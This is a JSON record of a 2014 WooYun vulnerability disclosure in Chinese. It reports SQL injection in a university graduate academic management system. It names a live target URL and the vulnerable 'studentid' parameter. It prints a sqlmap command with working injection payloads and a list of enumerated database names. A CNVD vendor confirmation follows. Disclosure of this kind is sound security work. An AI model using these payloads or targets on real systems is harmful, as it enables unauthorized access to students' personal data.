{"id": 54704, "wybug_id": "wooyun-2014-063632", "wybug_title": "某高校研究生教务通用系统sql注射漏洞(涉及不少高校)", "wybug_corp": "高校研究生教务系统", "wybug_author": "piaoye", "wybug_date": "2014-06-09 11:58", "wybug_open_date": "2014-07-24 12:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "数据库账户权限过高", "字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向公众公开  简要描述： 涉及到较多高校，不乏211，问题是一个高校常用的研究生管理系统，估计上万学生信息暴露。 详细说明：  看了这个bug，发现这个系统还存在注射问题。。。 WooYun: 某高校研究生教务通用系统未授权访问泄漏学生敏感信息(涉及不少高校) studentid 参数未作处理 导致注射。。。随便找一个：http://210.33.16.51/Gmis/xjgl/student_info9.asp?studentid=1212421056   漏洞证明：  \nD:\\Python27\\sqlmap>sqlmap.py -u http://210.33.16.51/Gmis/xjgl/student_info9.asp?studentid=1212421056 --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutua consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not resposible for any misuse or damage caused by this program[*] starting at 11:08:19[11:08:19] [INFO] resuming back-end DBMS 'microsoft sql server'[11:08:19] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requsts:---Place: GETParameter: studentid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: studentid=1212421056' AND 5869=5869 AND 'rTVT'='rTVT    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: studentid=1212421056' AND 4986=CONVERT(INT,(SELECT CHAR(113)+CHAR(03)+CHAR(115)+CHAR(97)+CHAR(113)+(SELECT (CASE WHEN (4986=4986) THEN CHAR(49) ESE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(110)+CHAR(97)+CHAR(113))) AND 'EJoS''EJoS    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: studentid=1212421056'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: studentid=1212421056' WAITFOR DELAY '0:0:5'-----[11:08:19] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[11:08:19] [INFO] fetching database names[11:08:19] [INFO] the SQL query used returns 13 entries[11:08:19] [INFO] retrieved: AdventureWorks[11:08:19] [INFO] retrieved: AdventureWorksDW[11:08:21] [INFO] retrieved: choujian[11:08:21] [INFO] retrieved: data_paper[11:08:21] [INFO] retrieved: dataschool[11:08:22] [INFO] retrieved: gmis[11:08:24] [INFO] retrieved: gmis1[11:08:27] [INFO] retrieved: gxk[11:08:27] [INFO] retrieved: master[11:08:30] [INFO] retrieved: model[11:08:30] [INFO] retrieved: msdb[11:08:30] [INFO] retrieved: New_sy_core_ldxwlw1[11:08:31] [INFO] retrieved: tempdbavailable databases [13]:[*] AdventureWorks[*] AdventureWorksDW[*] choujian[*] data_paper[*] dataschool[*] gmis[*] gmis1[*] gxk[*] master[*] model[*] msdb[*] New_sy_core_ldxwlw1[*] tempdb\n   修复方案：  cnvd一起通知修复下，各种库，发现里面有考试论文等系统。。   版权声明：转载请注明来源 piaoye@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-06-14 09:20 厂商回复： CNVD确认并复现所述多个实例情况（由上海交通大学网络信息中心协助验证完成），已经由CNVD同步通报软件生产厂同南京南软科技有限公司，并将案例通报给教育网应急组织赛尔网络公司，抄报CCERT。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}